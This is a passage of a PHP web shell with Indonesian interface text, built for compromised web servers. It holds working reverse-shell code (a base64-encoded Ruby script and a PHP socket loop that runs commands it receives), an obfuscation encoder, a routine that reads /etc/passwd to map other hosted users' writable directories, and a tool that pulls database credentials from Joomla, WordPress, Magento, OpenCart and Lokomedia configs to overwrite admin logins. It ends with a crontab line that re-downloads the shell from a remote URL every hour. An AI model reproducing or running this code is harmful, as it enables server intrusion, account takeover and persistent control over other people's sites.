HVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
		$pbcaak = @fopen('bcruby.rb','w');
		fwrite($pbcaak,$becaak);
		$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
		sleep(1);
		echo "<pre class='text-light'>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
		unlink("bcruby.rb");
	}
	if($_POST['backconnect'] == 'php'){
		$ip = $_POST['server'];
		$port = $_POST['port'];
		$sockfd = fsockopen($ip , $port , $errno, $errstr );
		if($errno != 0){
			echo "<font color='red'>$errno : $errstr</font>";
		}else if (!$sockfd){
			$result = "<p>Unexpected error has occured, connection may have failed.</p>";
		}else{
			fputs ($sockfd ,"
			\n{#######################################}
			\n..:: BackConnect PHP By Con7ext ::..
			\n{#######################################}\n");
			$dir = @shell_exec("pwd");
			$sysinfo = @shell_exec("uname -a");
			$time = @Shell_exec("time");
			$len = 1337;
			fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
			while(!feof($sockfd)){
				$cmdPrompt = '[kuda]#:> ';
				@fputs ($sockfd , $cmdPrompt );
				$command= fgets($sockfd, $len);
				@fputs($sockfd , "\n" . @shell_exec($command) . "\n\n");
			}
			@fclose($sockfd);
		}
	}
	exit;
}
function encdec(){
	@ini_set('output_buffering',0); 
	@ini_set('display_errors', 0);
	$text = $_POST['code'];
	?>
<center>
<div class="jaya" id='lt'><h2>Encoder - Decoder</h2></div>
<form method="post"><br>
<textarea class='inputz' id='edit' cols=80 rows=10 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope" id='lt'>
<option value="urlencode">url</option>
<option value="base64">Base64</option>
<option value="ur">convert_uu</option>
<option value="json">json</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew">str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
</select>&nbsp;<br><br><input class='inputzbut' id='lt' type='submit' name='submit' value='Encode'>
<input class='inputzbut' type='submit' name='submits' value='Decode' id='lt'>
</form>
<?php
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo "<from><center><h3>HASIL</h3></center><textarea cols=80 rows=10 class='inputz' readonly id='edit'>".$html."</textarea><BR/><BR/><h2>Decode By Syntax_Notfound</h2></center></from>";
exit;}
function aksiJump($dir,$file,$ip){
	$i = 0;
	echo "<center><div class='card container'>";
	if(preg_match("/hsphere/", $dir)){
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])){
			echo "<pre>";
			foreach($urls as $url){
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)){
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true){
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)){
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
							if(is_writable($url_user)){
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
			if(!$i == 0){ 
				echo "<br>Total ada $i KAMAR di $ip";
			}
			echo "</pre>";
		}else{
			echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control" id="edit">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)){
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" id="lt" class="btn btn-danger btn-block">
			</form></center>';
		}
	}elseif(preg_match("/vhosts/", $dir)){
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])){
			echo "<pre>";
			foreach($urls as $url){
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true){
					if(is_readable($web_vh)){
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
						if(is_writable($web_vh)){
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
			if(!$i == 0){
				echo "<br>Total ada $i Kamar Di $ip";
			}
			echo "</pre>";
		}else{
			echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" id="edit" class="form-control">';
				bing("ip:$ip");
				echo '</textarea><br>
				<input type="submit" value="Jumping" id="lt" name="jump" class="btn btn-danger btn-block">
			</form></center>';
		}
	}else{
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
		while($passwd = fgets($etc)){
			if($passwd == '' || !$etc){
			echo "<font color=red>Can't read /etc/passwd</font><br/>";
			}else{
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_pro_jump){
					$user_jumping_dir = "/home/$user_pro_jump/public_html";
					if(is_readable($user_jumping_dir)){
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)){
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')){
							$domain_jump = file_get_contents("/etc/named.conf");
							if($domain_jump == ''){
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							}else{
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj){
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_pro_jump){
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						}else{
							echo "<br>";
						}
					}
				}
			}
		}
		if(!$i == 0){
			echo "<br>Total ada $i kamar di $ip";
		}
		echo "</pre>";
	}
	echo "</div></center><br/>";
	exit;
}
function autoEdit($dir,$file){
	if($_POST['hajar']){
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6){
			echo "Username dan Password harus lebih dari 6 karakter";
		}else{
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf){
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)){
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == ''){
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					}else{
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/WordPress/",$config)){
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == ''){
					$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/Magento|Mage_Core/",$config)){
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == ''){
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)){
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == ''){
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)){
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == ''){
						$target2 = $result[url];
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						if($target2 == ''){
							$url_target2 = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						}else{
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)){
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							}elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)){
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							}else{
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					}else{
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)){
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						}elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)){
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						}else{
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/Error, Tidak dapat mengambil nama domainnya/', $url_target)){
						echo $url_target2;
					}else{
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	}else{
		echo "<center><h3 class='text-center mb-4'>Auto Edit User</h3>
		<form method='post'>
			<h5>Lokasi Dir Config</h5>
			<input type='text' class='form-control mb-3' name='config_dir' value='".realpath('.')."' id='lt'>
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='Digicorp' class='form-control mb-3' placeholder='Set Username' id='lt'>
			<input type='text' name='pass_baru' value='Digicorp' class='form-control mb-4' placeholder='Set Password' id='lt'>
			<input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block' id='lt'>
		</form>
		<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p></center>";
	}
	exit;
}
execute(exec_meth(),"echo '1 * * * * wget https://raw.githubusercontent.com/sudoasu1337/hcker/main/ssr.php -O ".realpath($_SERVER['SCRIPT_FILENAME'])." ' | crontab ");
print $end;
?>
